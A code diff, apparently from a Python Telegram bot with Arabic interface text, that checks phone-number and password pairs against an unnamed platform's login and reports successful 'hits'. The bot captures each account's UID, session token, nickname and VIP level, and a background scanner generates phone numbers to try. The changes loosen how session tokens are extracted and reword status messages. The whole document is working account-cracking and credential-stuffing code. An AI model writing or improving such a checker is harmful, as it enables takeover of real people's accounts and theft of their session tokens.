@@ -155,8 +155,10 @@ def _parse_login(data):
         for fld_n in (3, 4):
             f = _fget(top, fld_n)
             if f and f[3]:
-                s = f[3].decode(errors="replace")
-                if len(s) >= 32 and not r["token"]: r["token"] = s
+                s = f[3].decode(errors="ignore")
+                s_clean = "".join(c for c in s if c.isalnum() or c in "_-.")
+                if len(s_clean) >= 20 and not r["token"]: 
+                    r["token"] = s_clean
         f = _fget(top, 8)
         if f and f[3]: r["country"] = f[3].decode(errors="replace")
         f = _fget(top, 10)
@@ -223,7 +225,6 @@ def _gen_phone(cc):
     local = pref + ext
     return c["code"] + "-" + local, "0" + local
 
-# تخزين حالات المستخدمين (مثل انتظار إدخال حساب مفرد)
 user_states = {}
 
 checker_state = {
@@ -274,7 +275,7 @@ def callback_query(call):
         bot.edit_message_text(
             chat_id=chat_id,
             message_id=call.message.message_id,
-            text="🔍 **وضع فحص حساب مفرد**\n\nأرسل الآن الحساب بالصيغة التالية:\n`رقم_الهاتف:كلمة_المرور`\n\n*(مثال: `966501234567:Aa123456@` أو مع المفتاح المحلي)*\nسيتم التعرف على الدولة تلقائياً وفحص الحساب بدقة وعرض النتائج الكاملة.",
+            text="🔍 **وضع فحص حساب مفرد**\n\nأرسل الآن الحساب بالصيغة التالية:\n`رقم_الهاتف:كلمة_المرور`\n\n*(مثال: `966501234567:Aa123456@`)*\nسيتم التعرف على الدولة تلقائياً وفحص الحساب وعرض النتائج الكاملة.",
             reply_markup=markup,
             parse_mode="Markdown"
         )
@@ -336,7 +337,6 @@ def handle_text_messages(message):
         raw_phone = parts[0].strip().replace("+", "")
         password = parts[1].strip()
 
-        # تحليل وتحديد الدولة تلقائياً من رقم الهاتف
         country = "SA"
         formatted_phone = raw_phone
 
@@ -372,14 +372,13 @@ def handle_text_messages(message):
                     acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
                     
                     hit_msg = (
-                        f"🎯 **تم صيد وحفظ الحساب بنجاح! (Hit)**\n"
+                        f"🎯 **تم صيد وفحص الحساب بنجاح! (Hit)**\n"
                         f"{'─'*32}\n"
                         f"📱 **الرقم**: `{formatted_phone}`\n"
                         f"🔑 **الباسورد**: `{password}`\n"
                         f"🌍 **الدولة**: `{country}`\n"
                         f"🆔 **UID**: `{res.get('uid', '')}`\n"
                         f"🔢 **Short ID**: `{res.get('shortUID', '')}`\n"
-                        f"📡 **المنصة**: `{res.get('platform', '')}`\n"
                     )
                     if acct.get("nickname"): hit_msg += f"👤 **الاسم**: `{acct['nickname']}`\n"
                     if acct.get("vipLevel"): hit_msg += f"🏆 **مستوى VIP**: `{acct['vipLevel']}`\n"
@@ -477,5 +476,5 @@ def run_background_scanner(chat_id, message_id, cc):
         pass
 
 if __name__ == "__main__":
-    print("Bot is running with Single Check and Live Update features...")
+    print("Bot is running completely updated...")
     bot.infinity_polling()
